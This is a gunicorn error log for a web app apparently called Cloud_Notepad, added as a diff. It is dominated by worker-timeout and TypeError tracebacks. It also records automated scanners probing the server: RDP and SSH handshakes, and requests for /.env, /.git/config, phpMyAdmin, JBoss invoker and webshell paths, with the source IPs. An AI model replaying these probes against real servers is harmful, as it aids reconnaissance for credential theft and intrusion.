+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-25 09:59:19 +0800] [784987] [INFO] Worker exiting (pid: 784987)
+[2025-05-25 09:59:19 +0800] [956189] [INFO] Booting worker with pid: 956189
+[2025-05-25 10:32:31 +0800] [956189] [WARNING] Invalid request from ip=193.46.255.57: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 11:20:58 +0800] [956189] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+[2025-05-25 13:24:54 +0800] [956189] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /invoker/EJBInvokerServlet
+Not Found: /invoker/JMXInvokerServlet
+Not Found: /web-console/ServerInfo.jsp
+Not Found: /actuator/health
+[2025-05-25 14:24:00 +0800] [956189] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /.git/config
+Not Found: /favicon.ico
+Not Found: /443
+[2025-05-25 14:59:18 +0800] [956189] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-25 15:42:25 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:956189)
+[2025-05-25 15:42:25 +0800] [956189] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 269, in parse
+    self.get_data(unreader, buf, stop=True)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-25 15:42:25 +0800] [956189] [INFO] Worker exiting (pid: 956189)
+[2025-05-25 15:42:25 +0800] [1061756] [INFO] Booting worker with pid: 1061756
+[2025-05-25 15:43:15 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1061756)
+[2025-05-25 15:43:15 +0800] [1061756] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-25 15:43:15 +0800] [1061756] [INFO] Worker exiting (pid: 1061756)
+[2025-05-25 15:43:15 +0800] [1062015] [INFO] Booting worker with pid: 1062015
+Not Found: /.env
+Not Found: /lAVY
+Not Found: /fEYY
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /fEYY
+Not Found: /aab8
+Not Found: /aab9
+[2025-05-25 19:10:38 +0800] [1062015] [WARNING] Invalid request from ip=39.98.70.168: Invalid HTTP request line: ''
+Not Found: /favicon.ico
+[2025-05-25 19:19:25 +0800] [1062015] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-25 19:19:25 +0800] [1062015] [INFO] Worker exiting (pid: 1062015)
+[2025-05-25 19:19:25 +0800] [3846911] [ERROR] Worker (pid:1062015) exited with code 255
+[2025-05-25 19:19:25 +0800] [3846911] [ERROR] Worker (pid:1062015) exited with code 255.
+[2025-05-25 19:19:25 +0800] [1128476] [INFO] Booting worker with pid: 1128476
+Not Found: /favicon.ico
+[2025-05-25 19:30:55 +0800] [1128476] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /Public/home/js/check.js
+[2025-05-26 00:19:35 +0800] [1128476] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-26 00:29:24 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1128476)
+[2025-05-26 00:29:24 +0800] [1128476] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-26 00:29:24 +0800] [1128476] [INFO] Worker exiting (pid: 1128476)
+[2025-05-26 00:29:24 +0800] [1224245] [INFO] Booting worker with pid: 1224245
+Not Found: /v1/models
+[2025-05-26 01:19:16 +0800] [1224245] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /ips/index.php
+Not Found: /ips/index.php
+Not Found: /index.php
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /chs/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /stylesheets/theme.css
+Not Found: /stylesheets/theme.css
+Not Found: /customer/js/lang_zh_tw.js
+Not Found: /index.php
+Not Found: /index.php
+Not Found: /login/stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /login/stylesheets/theme.css
+Not Found: /public/stylesheets/theme.css
+Not Found: /ips/index.php
+[2025-05-26 01:42:45 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1224245)
+[2025-05-26 01:42:45 +0800] [1224245] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-26 01:42:45 +0800] [1224245] [INFO] Worker exiting (pid: 1224245)
+[2025-05-26 01:42:45 +0800] [1246868] [INFO] Booting worker with pid: 1246868
+Not Found: /index.php
+Not Found: /api/client/update
+Not Found: /ips/index.php
+[2025-05-26 03:20:06 +0800] [1246868] [WARNING] Invalid request from ip=3.149.59.26: Invalid HTTP request line: 'SSH-2.0-Go'
+Not Found: /phpmyadmin/index.php
+Not Found: /pmd/index.php
+Not Found: /phpmyadmin4.8.5/index.php
+Not Found: /ping.js
+Not Found: /hudson
+Not Found: /kjN9
+Not Found: /IfbL
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /aab8
+Not Found: /kjN9
+Not Found: /IfbL
+[2025-05-26 05:36:33 +0800] [1246868] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /aab9
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /index.php
+Not Found: /form.html
+Not Found: /favicon.ico
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /_profiler/phpinfo
+Not Found: /developmentserver/metadatauploader
+[2025-05-26 10:46:07 +0800] [1246868] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /api/client/update
+[2025-05-26 11:12:43 +0800] [1246868] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-26 12:10:55 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1246868)
+[2025-05-26 12:10:55 +0800] [1246868] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-26 12:10:55 +0800] [1246868] [INFO] Worker exiting (pid: 1246868)
+[2025-05-26 12:10:55 +0800] [1440178] [INFO] Booting worker with pid: 1440178
+[2025-05-26 16:15:03 +0800] [1440178] [WARNING] Invalid request from ip=45.142.193.4: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-26 17:07:06 +0800] [1440178] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-26 17:18:31 +0800] [1440178] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-26 18:03:36 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1440178)
+[2025-05-26 18:03:36 +0800] [1440178] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-26 18:03:36 +0800] [1440178] [INFO] Worker exiting (pid: 1440178)
+[2025-05-26 18:03:37 +0800] [1548895] [INFO] Booting worker with pid: 1548895
+Not Found: /favicon.ico
+[2025-05-26 18:51:36 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1548895)
+[2025-05-26 18:51:36 +0800] [1548895] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-26 18:51:36 +0800] [1548895] [INFO] Worker exiting (pid: 1548895)
+[2025-05-26 18:51:37 +0800] [1563654] [INFO] Booting worker with pid: 1563654
+Not Found: /password.php
+Not Found: /t4
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /systembc/password.php
+Not Found: /boaform/admin/formLogin
+Not Found: /.env
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /portal/redlion
+Not Found: /favicon.ico
+[2025-05-26 23:10:46 +0800] [1563654] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-26 23:10:46 +0800] [1563654] [INFO] Worker exiting (pid: 1563654)
+[2025-05-26 23:10:46 +0800] [3846911] [ERROR] Worker (pid:1563654) exited with code 255
+[2025-05-26 23:10:46 +0800] [3846911] [ERROR] Worker (pid:1563654) exited with code 255.
+[2025-05-26 23:10:46 +0800] [1643416] [INFO] Booting worker with pid: 1643416
+Not Found: /favicon.ico
+[2025-05-27 00:00:52 +0800] [1643416] [WARNING] Invalid request from ip=93.123.109.218: Invalid HTTP request line: 'SSH-2.0-OpenSSH'
+Not Found: /favicon.ico
+[2025-05-27 03:09:53 +0800] [1643416] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-27 03:09:53 +0800] [1643416] [INFO] Worker exiting (pid: 1643416)
+[2025-05-27 03:09:53 +0800] [3846911] [ERROR] Worker (pid:1643416) exited with code 255
+[2025-05-27 03:09:53 +0800] [3846911] [ERROR] Worker (pid:1643416) exited with code 255.
+[2025-05-27 03:09:53 +0800] [1717037] [INFO] Booting worker with pid: 1717037
+Not Found: /favicon.ico
+Not Found: /manager/text/list
+[2025-05-27 04:13:09 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:1717037)
+[2025-05-27 04:13:09 +0800] [1717037] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
